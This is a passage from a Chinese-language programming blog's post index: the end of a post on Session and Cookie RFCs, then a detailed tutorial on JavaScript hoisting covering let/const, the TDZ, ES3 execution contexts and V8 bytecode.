RFCs, and Chromium has compatibility with existing browsers as a higher priority than RFC compliance. An RFC that more closely describes how browsers normally handles cookies is being considered by the RFC; it is available at http://tools.ietf.org/html/draft-ietf-httpstate-cookie. The various RFCs should be examined to understand basic cookie behavior; this document will only describe variations from the RFCs. 在 CookieMonster.cc 裡面也有寫到： If the cookie is being set from an insecure scheme, then if a cookie already exists with the same name and it is Secure, then the cookie should not be updated if they domain-match and ignoring the path attribute. See: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone 文中所提到的文件還在草稿階段，標題是：「Deprecate modification of ‘secure’ cookies from non-secure origins」，是由 Google 的員工所發起的草稿。在 Introduction 的地方寫的很明確了： Section 8.5 and Section 8.6 of [RFC6265] spell out some of the drawbacks of cookies’ implementation: due to historical accident, non-secure origins can set cookies which will be delivered to secure origins in a manner indistinguishable from cookies set by that origin itself. This enables a number of attacks, which have been recently spelled out in some detail in [COOKIE-INTEGRITY]. We can mitigate the risk of these attacks by making it more difficult for non-secure origins to influence the state of secure origins. Accordingly, this document recommends the deprecation and removal of non-secure origins’ ability to write cookies with a ‘secure’ flag, and their ability to overwrite cookies whose ‘secure’ flag is set. 大意就是說跟我們剛剛在 RFC 6265 的 Section 8.5 與 8.6 看到的一樣，由於一些歷史因素，secure 的 cookie 可以被 non-secure 的來源蓋掉。而這份文件就是要試著阻止這種行為。 看到這邊，與 Session 跟 Cookie 相關的文件差不多都讀完了，讓我們做個簡單的總結。 總結 回到最開始的問題：到底 Session 是什麼？ 從 RFC 裡面提到的各種 Session 相關的字眼，我會認為 Session 就是它英文的原意之一，代表著：「具有狀態的一段期間」或者是「上下文」，所以你想要開啟或是建立一個 Session，必要條件就是先有一個機制來建立及保留狀態。 這也是為什麼 Cookie 的 RFC 標題為：HTTP State Management Mechanism，狀態管理機制。在 Cookie 還沒出現以前，一樣可以建立 Session，可以把狀態資訊放在網址列上面或是藏在 form 表單中。但 Cookie 出現以後建立 Session 變成一件更容易的事，只要使用 Set-Cookie 與 Cookie 這兩個 header 就好了。 建立 Session 之後，所儲存的狀態就叫做 Session information，可以翻作 Session 資訊。若是選擇把這些資訊存在 Cookie 裡面，就叫做 Cookie-based session；還有另一種方法則是在 Cookie 裡面只存一個 SessionID，其他的 Session 資訊都存在 Server 端，靠著這個 ID 把兩者關聯起來。 除了 Session 以外，我們也在 RFC 裡面看見一些有趣的東西，例如說第三方 Cookie 的隱私疑慮以及與 Cookie 相關的安全性問題。這些也能加深你對於 Cookie 的理解。 在結束以前，我誠心推薦一篇文章：HTTP Cookies: Standards, Privacy, and Politics，網頁右邊可以下載 PDF 來看。這篇文章的作者就是 RFC 2109 與 2965 的作者。文章裡面把 Cookie 出現的歷史以及當初發生的事講的一清二楚，強烈建議大家都可以花點時間來看這篇文章，可以深入地理解 Cookie 與 Session 早期的歷史。 最後，別忘了這是系列文的第二篇，下一篇我們會來看一些主流框架如何處理 Session。 三篇的完整連結如下： 白話 Session 與 Cookie：從經營雜貨店開始 淺談 Session 與 Cookie：一起來讀 RFC 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作","link":"/2019/08/09/session-and-cookie-part2/"},{"title":"我知道你懂 hoisting，可是你了解到多深？","text":"前言 這陣子我在忙一些教學相關的東西，稍微準備一些資料之後教了學生們 JavaScript 裡面的 hoisting，也就是「提升」這個觀念，例如說以下程式碼： 12console.log(a)var a = 10 會輸出undefined而不是ReferenceError: a is not defined，這種現象就叫做 Hoisting，變數的宣告被「提升」到最上面去了。 如果你只想了解最基本的 hoisting，其實差不多就是這樣，但後來我還教了let跟const相關的一些知識，不過前一天剛教學完，隔天就立刻看到相關的技術文章還發現自己教錯，因此特別花了一點時間打算好好理解 hoisting 這個東西。 很多東西沒有深入研究的時候你都會覺得沒什麼，真的跳下去深入去看才會發現自己其實還有一大堆概念沒有搞懂。 有很多人都知道 hoisting，但是理解程度卻不盡相同，我列出了 10 個項目，如果有任何一點你剛好不知道的話，那恭喜，這篇文章應該可以為你帶來一些收穫。 你知道什麼是 hoisting 你知道 hoisting 只會提升宣告而非賦值 你知道 function 宣告、function 的參數以及一般變數宣告同時出現時的提升優先順序 你知道 let 跟 const 沒有 hoisting 你知道第四點是錯的，其實有但只是表現形式不一樣 你知道有關第五點，有個概念叫做 TDZ（Temporal Dead Zone） 你看過 ES3 的規格書，知道裡面是怎麼描述的 你看過 ES6 的規格書，知道裡面是怎麼描述的 你知道 hoisting 背後的原理是什麼 你看過 V8 編譯出來的程式碼 你可能會問說：「我為什麼要知道的這麼深？有什麼用？」，其實我也覺得對 hoisting，只要知道基本的就行了。只要你有好好地宣告變數，就算不知道那些，對日常生活或是工作也不會有太大的影響。 可是假如你像我一樣，想要有朝一日在自己的履歷上面放上「精通 JavaScript」的話，那對這些東西就不能逃避。同時你如果對底層的這些細節愈熟悉，會碰到的問題就愈少，也愈能理解為什麼會有 hoisting 的出現，當你想要在技術這條路上走得更遠爬得更高時，我覺得這些細節是很重要的。 接下來，我們就一步步來看 hoisting 吧！ 什麼是 hoisting？ 在 JavaScript 裡面，如果你試圖去對一個還沒宣告的變數取值，會發生以下錯誤： 12console.log(a)// ReferenceError: a is not defined 會回傳一個a is not defined的錯誤，因為你還沒宣告這個變數，所以 JavaScript 也找不到這變數在哪，自然就會拋出錯誤。 可是如果你這樣子寫，神奇的事情發生了： 12console.log(a) // undefinedvar a 從以前學程式的時候我們就學到了一個觀念，「程式是一行一行跑的」，那既然是一行一行跑的，執行到第一行的時候不是還沒有宣告變數 a 嗎？那為什麼不是拋出a is not defined的錯誤，而是輸出了undefined？ 這種現象就叫做 hoisting，提升，在第二行的var a因為某種原因被「提升」到了最上面，所以上面的程式碼你可以「想像」成這樣： 12var aconsole.log(a) // undefined 我會特別強調「想像」，是因為程式碼的位置其實不會被移動，所以不要把提升想成是 JavaScript 引擎幫你把變數宣告都「移動」到最上面，這是有問題的。它背後的原理跟移動程式碼一點關係都沒有。 再來還有一點要特別注意，那就是只有變數的宣告會提升，賦值不會，看看以下範例你就懂了： 12console.log(a) // undefinedvar a = 5 上面的程式碼你可以「想像」成這樣： 123var aconsole.log(a) // undefineda = 5 你可以把var a = 5這句話分成兩個步驟，第一個階段是宣告變數：var a，第二個階段是賦值：a = 5，只有前面的變數宣告會被提升，賦值不會。 到這邊你可能覺得還行，只是頭腦有一點點混亂，那恭喜你，等一下還有更多東西會讓你更亂，讓我們再把幾個東西加進來，看看能夠搞得多複雜。 如果我們像下面這樣做，會輸出什麼？ 12345function test(v)&#123; console.log(v) var v = 3&#125;test(10) 簡單嘛，根據剛剛學過的，把上面的程式碼變換成以下形式： 123456function test(v)&#123; var v console.log(v) v = 3&#125;test(10) 答案是undefined！輕輕鬆鬆。 可是瑞凡，答案是10而不是undefined。 其實變換的過程對了，只是遺漏了一個因素：傳進來的參數。把這個因素加進去以後，可以看成是這樣： 1234567function test(v)&#123; var v = 10 // 因為下面呼叫 test(10) var v console.log(v) v = 3&#125;test(10) 這時候你可能還是會問：「可是我在 log 以前不是重新宣告了一次變數並且沒有給值嗎？那它不是會被覆蓋成undefiend嗎？」 我們再來看一個簡單的小例子： 123var v = 5var vconsole.log(v) 答案會是5而不是undefined，想理解這個行為，你可以再回想一下前面把一個句子分成兩塊，宣告跟賦值，如果我們這樣切分再加上 hoisting 的話，其實上面程式碼可以想像成這樣： 1234var vvar vv = 5console.log(v) 這樣你就知道為什麼答案是 5 了。 此時的你應該覺得頭腦有點快爆炸了，為什麼這麼多規則要記？別擔心，我們還有最後一個例子，保證讓你叫苦連天。 123console.log(a) //[Function: a]var afunction a()&#123;&#125; 除了變數宣告以外，function 的宣告也會提升而且優先權比較高，因此上面的程式碼會輸出function而不是undefined。 好，基本的 hoisting 概念就到這邊結束了，幫你畫一下重點： 變數宣告跟函式宣告都會提升 只有宣告會提升，賦值不會提升 別忘了函式裡面還有傳進來的參數 別急，還有 ES6 新增的 let 跟 const 沒有講。 let 跟 const 與 hoisting 在 ES6 裡面我們有了新的兩個宣告變數的關鍵字，let 與 const，這兩個對 hoisting 的行為是差不多的，因此我下面只拿 let 來舉例，可以看一下以下程式碼： 12console.log(a) // ReferenceError: a is not definedlet a 謝天謝地，終於沒有那麼多規則要記了！ 從以上程式碼看起來，let 與 const 應該是沒有變數提升吧，否則就不會拋出這個 Error 了。 我之前也是很天真這樣想的，直到我看到以下範例： 123456var a = 10function test()&#123; console.log(a) let a&#125;test() 如果 let 真的沒有 hoisting 的話，答案應該會輸出10，因為 log 那一行會存取到外面的var a = 10的這個變數，可是！！！ 答案卻是：ReferenceError: a is not defined。 意思就是，它的確提升了，只是提升後的行為跟 var 比較不一樣，所以乍看之下你會以為它沒有提升。 這個觀念我們會在之後詳細講解，但在這之前我們先做個簡單的總結。 有很多提到 hoisting 的文章，講到這邊就差不多了，就大概講一些 hoisting 的行為以及 let 與 const 的不同之處，但我覺得只講到這裡其實是很可惜的一件事情。 因為如果你只理解到這個程度，就會以為 hoisting 不過就是一大堆複雜的規則要記，根本沒什麼，誰能夠記這麼多規則？不就是背書而已嗎？ 這是因為上面那些只讓你理解了「表面」，舉出幾個不同的例子跟你說會有這樣的行為發生，可是卻沒有跟你說「為什麼會這樣」，或者是「實際上是怎麼運作的」，若是你想真正了解 hoisting 是什麼，必須要找出以下兩個問題的答案，一但找出了，保證你任督二脈直接被打通： 為什麼我們需要 hoisting？ Hoisting 到底是怎麼運作的？ 為什麼我們需要 hoisting？ 在問這樣的一個問題時，其實你可以反過來想：「如果我們沒有 hoisting 會怎樣？」 第一，我們一定要先宣告變數才可以使用。 這點其實很不錯，畢竟這是一個好習慣。 第二，我們一定要先宣告函式才可以使用。 這一點就不太好了，很不方便，如果是這樣的話那可能在每個檔案你都必須把 function 宣告放到最上面去，才能保證你底下的程式碼都可以 call 到這些 function。 第三，沒有辦法達成 function 互相呼叫。 舉個例子： 123456789101112function loop(n)&#123; if (n&gt;1) &#123; logEvenOrOdd(--n) &#125;&#125; function logEvenOrOdd(n) &#123; console.log(n, n % 2 ? 'Odd' : 'Even') loop(n)&#125; loop(10) 我們在loop裡面呼叫logEvenOrOdd，在logEvenOrOdd裡面也呼叫loop，如果我們沒有 hoisting，那以上的程式碼就不可能達成，因為你不可能同時做到 A 在 B 上面而 B 又在 A 上面。 所以為什麼我們需要 hoisting？就是為了要解決上面的問題。 為了增添這一個說法的正確性，我引用一篇文章給大家看，在 Note 4. Two words about “hoisting”. 裡面有提到作者發了個 Twitter 問說 hoisting 的目的到底是什麼，然後 JavaScript 的作者有出來回應，以下是文章裡面附的原文跟回應： By the way, recently I raised this topic on Twitter and also mentioned as one of the reasons the mutual recursion. Brendan Eich also gave an acknowledgment that FDs hoisting is “for mutual recursion &amp; generally to avoid painful bottom-up ML-like order”. 如果想看完整對話截圖，可以看這篇文章：JavaScript系列文章：变量提升和函数提升，最下面有附。 hoisting 到底是怎麼運作的？ 現在我們知道了什麼是 hoisting，知道了為什麼需要 hoisting，接著就是欠缺的最後一塊拼圖了：到底 hoisting 是怎麼運作的？ 要回答這個問題，最好的方法就是去找 ECMAScript 的規格書來看，就像你今天想研究型別轉換的問題，解法一樣是去找規格書來看，理由很簡單，因為那些規則都清清楚楚寫在上面了。 ECMAScript 有很多版本，越後面的版本規格越多，所以為了方便起見，我們底下用 ES3 當作範例。 如果你看過 ES3 的規則，會發現用 hoisting 當關鍵字完全找不到東西，而與 hoisting 這現象有關的段落其實在第十章：Execution Contexts。 這邊先非常簡單介紹一下什麼是 Execution Contexts（以下簡稱 EC），每當你進入一個 function 的時候，就會產生一個 EC，裡面儲存跟這個 function 有關的一些資訊，並且把這個 EC 放到 stack 裡面，當 function 執行完以後，就會把 EC 給 pop 出來。 示意圖大概就像這樣，要記得除了 function 有 EC 以外，還有一個 global EC： （來源：https://medium.freecodecamp.org/lets-learn-javascript-closures-66feb44f6a44） 簡而言之呢，所有 function 需要的資訊都會存在 EC，也就是執行環境裡面，你要什麼都去那邊拿就對了。 ECMAScript 是這樣描述的： When control is transferred to ECMAScript executable code, control is entering an execution context. Active execution contexts logically form a stack. The top execution context on this logical stack is the running execution context. 再來就是重點了，在10.1.3 Variable Instantiation的地方是這樣寫的： Every execution context has associated with it a variable object. Variables and functions declared in the source text are added as properties of the variable object. For function code, parameters are added as properties of the variable object. 每個 EC 都會有相對應的 variable object（以下簡稱 VO），在裡面宣告的變數跟函式都會被加進 VO 裡面，如果是 function，那參數也會被加到 VO 裡。 首先，你可以把 VO 想像成就是一個 JavaScript 的物件就好。 再來，VO 什麼時候會用到？你在存取值的時候會用到，例如說 var a = 10 這一句，之前有講過可以分成左右兩塊： var a：去 VO 裡面新增一個屬性叫做 a（如果沒有 a 這個屬性的話）並初始化成 undefined a = 10：先在 VO 裡面找到叫做 a 的屬性，找到之後設定為 10 （這邊如果 VO 裡面找不到怎麼辦？它會透過 scope chain 不斷往上尋找，如果每一層都找不到就會拋出錯誤。至於尋找跟建立 scope chain 的過程雖然與本文有關但可以講得太多了，額外再開一篇會比較適合，這邊就先不提了） 接著來看下一段： Which object is used as the variable object and what attributes are used for the properties depends on the type of code, but the remainder of the behaviour is generic. On entering an execution context, the properties are bound to the variable object in the following order: 最精華的只有這一句：「On entering an execution context, the properties are bound to the variable object in the following order」，在進入 EC 的時候，會按照以下順序把東西放到 VO 裡面： 下面的段落有點長，我節錄一下： For function code: for each formal parameter, as defined in the FormalParameterList, create a property of the variable object whose name is the Identifier and whose attributes are determined by the type of code. The values of the parameters are supplied by the caller as arguments to [[Call]]. If the caller supplies fewer parameter values than there are formal parameters, the extra formal parameters have value undefined 簡單來說就是對於參數，它會直接被放到 VO 裡面去，如果有些參數沒有值的話，那它的值會被初始化成 undefined。 舉例來說，假設我 function 長這樣： 12function test(a, b, c) &#123;&#125;test(10) 那我的 VO 就長這樣： 12345&#123; a: 10, b: undefined, c: undefined&#125; 所以參數是第一個優先順序，再來我們看第二個： For each FunctionDeclaration in the code, in source text order, create a property of the variable object whose name is the Identifier in the FunctionDeclaration, whose value is the result returned by creating a Function object as described in 13, and whose attributes are determined by the type of code. If the variable object already has a property with this name, replace its value and attributes. Semantically, this step must follow the creation of FormalParameterList properties. 對於 function 的宣告，一樣在 VO 裡面新增一個屬性，至於值的話就是建立 function 完之後回傳的東西（可以想成就是一個指向 function 的指標就好）。 再來是重點：「如果 VO 裡面已經有同名的屬性，就把它覆蓋掉」，舉個小例子： 1234function test(a)&#123; function a()&#123;&#125;&#125;test(1) VO 會長的像這樣，原本的參數a被覆蓋掉了： 123&#123; a: function a&#125; 最後來看對於變數的宣告該怎麼處理： For each VariableDeclaration or VariableDeclarationNoIn in the code, create a property of the variable object whose name is the Identifier in the VariableDeclaration or VariableDeclarationNoIn, whose value is undefined and whose attributes are determined by the type of code. If there is already a property of the variable object with the name of a declared variable, the value of the property and its attributes are not changed. Semantically, this step must follow the creation of the FormalParameterList and FunctionDeclaration properties. In particular, if a declared variable has the same name as a declared function or formal parameter, the variable declaration does not disturb the existing property. 對於變數，在 VO 裡面新增一個屬性並且把值設為 undefined，再來是重點：「如果 VO 已經有這個屬性的話，值不會被改變」 來重新整理一下，當我們在進入一個 EC 的時候（你可以把它想成就是在執行 function 後，但還沒開始跑 function 內部的程式碼以前），會按照順序做以下三件事： 把參數放到 VO 裡面並設定好值，傳什麼進來就是什麼，沒有值的設成 undefined 把 function 宣告放到 VO 裡，如果已經有同名的就覆蓋掉 把變數宣告放到 VO 裡，如果已經有同名的則忽略 在你看完規格並且稍微理解以後，你就可以用這個理論來解釋我們前面看過的程式碼了： 12345function test(v)&#123; console.log(v) var v = 3&#125;test(10) 每個 function 你都可以想成其實執行有兩個階段，第一個階段是進入 EC，第二個階段才是真的一行行執行程式。 在進入 EC 的時候開始建立 VO，因為有傳參數進去，所以先把 v 放到 VO 並且值設定為 10，再來對於裡面的變數宣告，VO 裡面已經有 v 這個屬性了，所以忽略不管，因此 VO 就長這樣子： 123&#123; v: 10&#125; 進入 EC 接著建立完 VO 以後，才開始一行行執行，這也是為什麼你在第二行時會印出 10 的緣故，因為在那個時間點 VO 裡面的 v 的確就是 10 沒錯。 如果你把程式碼換成這樣： 123456function test(v)&#123; console.log(v) var v = 3 console.log(v)&#125;test(10) 那第二個印出的 log 就會是 3，因為執行完第三行以後， VO 裡面的值被換成 3 了。 以上就是 ES3 的規格書裡面提到的執行流程，你只要記得這個執行流程，碰到任何關於 hoisting 的題目都不用怕，你按照規格書的方法去跑絕對沒錯。 當我知道了這一段執行流程以後，第一個感想是豁然開朗，覺得 hoisting 不再是什麼神秘的東西，你只要假裝自己是 JS 引擎，跟著跑就好。第二個感想是，JS 到底怎麼做到的？ 編譯與直譯：JS 引擎到底怎麼運作的？ 還記得我上面的時候有提過，以前學程式的時候一直有個概念，那就是「直譯」代表程式是一行行跑的，而 JS 作為一個直譯的語言，不是也該一行行跑嗎？ 可是如果真的一行行跑，那怎麼可能達成 hoisting 這個功能？你在執行第 n 行的時候根本不知道 n + 1 行是什麼，想提升是不可能的。 針對這個疑惑我上網找了很久的資料，最後找到一篇的說法我覺得滿合理的：虚拟机随谈（一）：解释器，树遍历解释器，基于栈与基于寄存器，大杂烩。 裡面提到了幾點我覺得寫得非常不錯，有破除了我滿多以前的迷思： 第一，語言一般只會定義抽象語義，不會強制用某種方式實現，像是 C 我們會說它是編譯型語言，可是 C 也有直譯器。所以當我們在說某種程式語言是直譯或編譯型的時候，其實是在指涉「大多數」而不是全部。 換言之，我們說 JavaScript 是直譯型語言，不代表 JavaScript 不能有編譯器，反之亦然。 第二，直譯器跟編譯器最大的差別在於「執行」。 編譯這個步驟就是把原始碼 A 編譯為目的碼 B，就這樣而已，但你要保證 A 跟 B 執行完的結果要相同。 而直譯就是你輸入原始碼 A，輸出就直接是你程式碼裡面要執行的語義，裡面怎麼做的是一個黑箱子。 原文裡面有一張圖畫得很不錯： 所以直譯器裡面也能有編譯，這是不衝突的，或是你也可以寫一個超簡單直譯器，就是你輸入原始碼以後幫你編譯完然後執行。 事實上很多種直譯器內部的運作方式都是先把原始碼編譯成某種中間碼再去執行，所以編譯這個步驟還是很常見的，而 JS 也是這樣運作的。 當你拋開以前那種「JS 就是要一行行執行」的舊觀念並擁抱「其實主流 JS 引擎都有編譯這個步驟」的想法後，你就不會覺得 hoisting 是無法達成的事情了。 前面我們已經有看規格，知道在 ES3 裡面的運行模式並且知道 VO 這個東西，但規格裡面描述的也只是抽象的東西，它並沒有寫說「實際上」是在哪個地方做處理的，而這地方其實就是編譯階段。 話說關於這個編譯直譯的問題其實我卡滿久的，因為以前觀念不正確的地方很多，現在慢慢把它修正過來，而對於 hoisting 其實我之前有點分不清楚規格跟實作的差別，後來還跑去問了You-Dont-Know-JS 的作者，也很幸運地得到回覆，有興趣的人可以看看：https://github.com/getify/You-Dont-Know-JS/issues/1375。 JS 引擎的運作 如同我上面所說的，其實現在主流 JS 引擎內部都會有編譯這個階段，而 hoisting 其實就是在編譯這個階段做處理的。引入了編譯階段以後，可以把 JS 分成編譯階段跟執行階段兩個步驟。 在編譯階段的時候，會處理好所有的變數及函式宣告並且加入到 scope 裡面，在執行的時候就一樣可以去使用它。詳細情形這一篇寫得很好：Hoisting in JavaScript ，我下面就直接改一下裡面的程式碼當做例子。 舉例來說，我有這樣一段程式碼： 12345678910var foo = \"bar\"var a = 1function bar() &#123; foo = \"inside bar\" var a = 2 c = 3 console.log(c) console.log(d)&#125;bar() 在編譯階段的時候會處理宣告的部分，所以會是這樣： 12345678Line 1：global scope，我要宣告一個變數叫做 fooLine 2：global scope，我要宣告一個變數叫做 aLine 3：global scope，我要宣告一個函式叫做 barLine 4：沒有任何變數宣告，不做事Line 5：bar scope，我要宣告一個變數叫做 aLine 6：沒有任何變數宣告，不做事Line 7：沒有任何變數宣告，不做事Line 8：沒有任何變數宣告，不做事 處理完後的東西差不多就長這樣： 123456789globalScope: &#123; foo: undefined, a: undefined, bar: function&#125; barScope: &#123; a: undefined&#125; 再來進入到執行階段，這邊有兩個專有名詞先記一下，在介紹之前我先給一個範例會比較好理解： 12var a = 10console.log(a) 上面這兩行有個差異，第一行的時候我們只需要知道「a 的記憶體位置在哪裡」就好，我們不關心它的值是什麼。 而第二行則是「我們只關心它的值是什麼，把值給我就好」，所以儘管兩行裡面都有a，但你可以看出來他們所要做的事情是不一樣的。 而第一行的 a 我們叫它 LHS（Left hand side）引用，第二行叫它 RHS（Right hand side）引用，這邊的 left 跟 right 指的是相對於等號的左右邊，但用這種方式理解的話其實不夠精確，因此像下面這樣記就好： LHS：請幫我去查這個變數的位置在哪裡，因為我要對它賦值。 RHS：請幫我查詢這個變數的值是什麼，因為我要用這個值。 有了這個概念以後，再看一次上面的範例程式碼，就可以一步一步來解釋： 12345678910var foo = \"bar\"var a = 1function bar() &#123; foo = \"inside bar\" var a = 2 c = 3 console.log(c) console.log(d)&#125;bar() Line 1：var foo = “bar” JS 引擎：global scope，我這裡有個對 foo 的 LHS 引用，你有看過它嗎？ 執行結果：scope 說有，所以成功找到 foo 並且賦值 這時候的 global scope： 12345&#123; foo: \"bar\", a: undefined, bar: function&#125; Line 2：var a = 1 JS 引擎：global scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？ 執行結果：scope 說有，所以成功找到 a 並且賦值 這時候的 global scope： 12345&#123; foo: \"bar\", a: 1, bar: function&#125; Line 10：bar() JS 引擎：global scope，我這裡有個對 bar 的 RHS 引用，你有看過它嗎？ 執行結果：scope 說有，所以成功返回 bar 的值並且呼叫 function Line 4：foo = “inside bar” JS 引擎：bar scope，我這裡有個對 foo 的 LHS 引用，你有看過它嗎？ 執行結果：bar scope 說沒有，所以去問上一層的 global scope JS 引擎：global scope，我這裡有個對 foo 的 LHS 引用，你有看過它嗎？ 執行結果：有，所以成功找到 foo 並且賦值 這時候的 global scope： 12345&#123; foo: \"inside bar\", a: 1, bar: function&#125; Line 5：var a = 2 JS 引擎：bar scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？ 執行結果：bar scope 說有，所以成功找到 a 並且賦值 此時的 bar scope： 123&#123; a: 2&#125; Line 6：c = 3 JS 引擎：bar scope，我這裡有個對 c 的 LHS 引用，你有看過它嗎？ 執行結果：bar scope 說沒有，所以去問上一層的 global scope JS 引擎：global scope，我這裡有個對 c 的 LHS 引用，你有看過它嗎？ 執行結果：沒有。 這時候有幾種結果，如果你是處在嚴格模式底下（use strict），會返回 ReferenceError: c is not defined 錯誤，如果你不是在嚴格模式，那 global scope 就會把 c 加上去並且設定成 3，這邊先假設我們不是在嚴格模式。 此時的 global scope： 123456&#123; foo: \"inside bar\", a: 1, bar: function, c: 3&#125; Line 7：console.log© JS 引擎：bar scope，我這裡有個對 c 的 RHS 引用，你有看過它嗎？ 執行結果：bar scope 說沒有，所以去問上一層的 global scope JS 引擎：global scope，我這裡有個對 c 的 RHS 引用，你有看過它嗎？ 執行結果：global scope 說有，所以成功返回 c 的值並且呼叫 console.log Line 8：console.log(d) JS 引擎：bar scope，我這裡有個對 d 的 RHS 引用，你有看過它嗎？ 執行結果：bar scope 說沒有，所以去問上一層的 global scope JS 引擎：global scope，我這裡有個對 d 的 RHS 引用，你有看過它嗎？ 執行結果：global scope 說沒有，所以返回錯誤 ReferenceError: d is not defined 以上就是 JS 引擎的運作流程，想更詳細了解的話可參考：You Don’t Know JS: Scope &amp; Closures、Chapter 4: Hoisting、Hoisting in JavaScript。 中場總結 再次回顧一下我們開場放的那十個項目： 你知道什麼是 hoisting 你知道 hoisting 只會提升宣告而非賦值 你知道 function 宣告、function 的參數以及一般變數宣告同時出現時的提升優先順序 你知道 let 跟 const 沒有 hoisting 你知道第四點是錯的，其實有但只是表現形式不一樣 你知道有關第五點，有個概念叫做 TDZ（Temporal Dead Zone） 你看過 ES3 的規格書，知道裡面是怎麼描述的 你看過 ES6 的規格書，知道裡面是怎麼描述的 你知道 hoisting 背後的原理是什麼 你看過 V8 編譯出來的程式碼 我們用了許多篇幅把其中的七點都講完了，剩下的是： 你知道有關第六點，有個概念叫做 TDZ（Temporal Dead Zone） 你看過 ES6 的規格書，知道裡面是怎麼描述的 你看過 V8 編譯出來的程式碼 關於 ES6 的規格那點我不打算詳細講（而且我也還沒詳細看完），因為變化還滿多的但基本上原理不變，就是多了一些專有名詞而已，想知道的可以參考這篇經典好文：ECMA-262-5 in detail. Chapter 3.2. Lexical environments: ECMAScript implementation.。 上面我們已經講了很多東西，所有跟 hoisting 有關的運作機制全部都講完了，但我相信依然需要一點時間吸收，但我相信吸收完以後你會覺得神清氣爽，想說 hoisting 不過如此而已。 接著呢，我們就要進入到這篇文章最後的部分了，也就是 TDZ 以及 V8。 Temporal Dead Zone 還記得我們說過 let 與 const 其實有 hoisting 嗎？並且舉了一個小範例來驗證這件事情。 let 與 const 確實有 hoisting，與 var 的差別在於提升之後，var 宣告的變數會被初始化為 undefined，而 let 與 const 的宣告不會被初始化為 undefined，而且如果你在「賦值之前」就存取它，就會拋出錯誤。 在「提升之後」以及「賦值之前」這段「期間」，如果你存取它就會拋出錯誤，而這段期間就稱做是 TDZ，它是一個為了解釋 let 與 const 的 hoisting 行為所提出的一個名詞。 我們用下面的程式碼當做例子： 12345678910function test() &#123; var a = 1; // c 的 TDZ 開始 var b = 2; console.log(c) // 錯誤 if (a &gt; 1) &#123; console.log(a) &#125; let c = 10 // c 的 TDZ 結束&#125;test() 當你在第八行執行以前試圖存取 c 的話，就會拋出錯誤。要注意的是 TDZ 並不是一個空間上的概念，而是時間，例如說以下程式碼： 12345678function test() &#123; yo() // c 的 TDZ 開始 let c = 10 // c 的 TDZ 結束 function yo()&#123; console.log(c) &#125;&#125;test() 在你進入 test 這個 function 的時候，就已經是 c 的 TDZ 了，所以當你執行 yo 並且執行到console.log(c)時，都還在 TDZ 裡面，要一直等到let c = 10被執行 TDZ 才會結束。 所以並不是說我把console.log(c)放在let c = 10下面就沒問題了，而是在「執行順序」上要在後面。 或是你也可以拋開這些名詞，用一句話總結： let 與 const 也有 hoisting 但沒有初始化為 undefined，而且在賦值之前試圖取值會發生錯誤。 Byte code 閱讀初體驗 上面既然談到了 JS 引擎，如果沒有談到 V8 那就有點可惜，在我研究 hoisting 的時候我一直很想知道一件事情：V8 編譯出來的程式碼到底長怎樣？ 感謝 Understanding V8’s Bytecode 這一篇精彩的文章，可以讓我們試著用 node.js 把程式碼編譯成 byte code 並且試圖解讀。 在看之前先來介紹什麼是 byte code，它就是一種介於高階語言與機器碼中間的語言，沒有高階語言好懂可是卻比機器碼好懂許多，而執行起來的效率也比較高。 下面這張圖就是文章裡面附的，很清楚地解釋了之間的關係： 接著我們用這一個簡單的 function 當作範例，來看編譯過後會長怎樣： 12345function funcA() &#123; var a = 10 console.log(a)&#125;funcA() 雖然只有一個 function，但是用 node.js 跑還是會出現一大堆東西，所以我們把結果先放到檔案裡面：node --print-bytecode test.js &gt; byte_code.txt 編譯出來的結果長這樣： 123456789101112131415[generating bytecode for function: funcA]Parameter count 1Frame size 24 76 E&gt; 0xeefa4feb062 @ 0 : 91 StackCheck 93 S&gt; 0xeefa4feb063 @ 1 : 03 0a LdaSmi [10] 0xeefa4feb065 @ 3 : 1e fb Star r0 100 S&gt; 0xeefa4feb067 @ 5 : 0a 00 02 LdaGlobal [0], [2] 0xeefa4feb06a @ 8 : 1e f9 Star r2 108 E&gt; 0xeefa4feb06c @ 10 : 20 f9 01 04 LdaNamedProperty r2, [1], [4] 0xeefa4feb070 @ 14 : 1e fa Star r1 108 E&gt; 0xeefa4feb072 @ 16 : 4c fa f9 fb 00 CallProperty1 r1, r2, r0, [0] 0xeefa4feb077 @ 21 : 04 LdaUndefined 115 S&gt; 0xeefa4feb078 @ 22 : 95 Return Constant pool (size = 2)Handler Table (size = 16) 我們把前面一些資訊清空並加上註解，好讓大家知道上面程式碼是什麼意思（我其實也沒有真的很懂，這方面資料好像滿少的，如果有錯請糾正）： 12345678910StackCheck LdaSmi [10] // 把 10 放到 accumulator 裡面Star r0 // 把 accumulator 的值放到 r0 裡，所以 r0 = 10LdaGlobal [0], [2] // 載入一個 Global 的東西到 acc 裡Star r2 // 把它存到 r2，根據後見之明，r2 應該就是 consoleLdaNamedProperty r2, [1], [4] // 載入一個 r2 的 Property（應該就是 log）Star r1 // 把它存到 r1，也就是 r1 = console.logCallProperty1 r1, r2, r0, [0] // console.log.call(console, 10)LdaUndefined // 把 undefined 放到 accReturn // return undefined 再來我們把順序顛倒，變成這樣： 12345function funcA() &#123; console.log(a) var a = 10&#125;funcA() 來看看輸出的 byte code 會變什麼樣子，看解釋之前你可以先對照一下上面的，看看差別在哪： 12345678910StackCheckLdaGlobal [0], [2] // 載入一個 Global 的東西到 acc 裡Star r2 // 把它存到 r2，根據後見之明，r2 應該就是 consoleLdaNamedProperty r2, [1], [4] // 載入一個 r2 的 Property（應該就是 log）Star r1 // 把它存到 r1，也就是 r1 = console.logCallProperty1 r1, r2, r0, [0] // console.log.call(console, undefined)LdaSmi [10] // 把 10 放到 accumulator 裡面Star r0 // 把 accumulator 的值放到 r0 裡，所以 r0 = 10LdaUndefined // 把 undefined 放到 accReturn // return undefined 其實只是順序調換了一下，在輸出的地方直接 log 了 r0，這邊我不確定的是 r0 原本就是 undefined，還是在其他地方被初始化成 undefined。 再來我們看看如果試圖印出一個未宣告的變數會發生什麼事： 12345function funcA() &#123; console.log(b) var a = 10&#125;funcA() 因為大部分程式碼都跟前面重複我就不再註解了： 123456789101112StackCheck LdaGlobal [0], [2]Star r2LdaNamedProperty r2, [1], [4]Star r1LdaGlobal [2], [6] // 試圖載入 b 的值，出錯Star r3CallProperty1 r1, r2, r3, [0]LdaSmi [10]Star r0LdaUndefined Return 整段的重點只有LdaGlobal那行，看起來應該是去載入 b 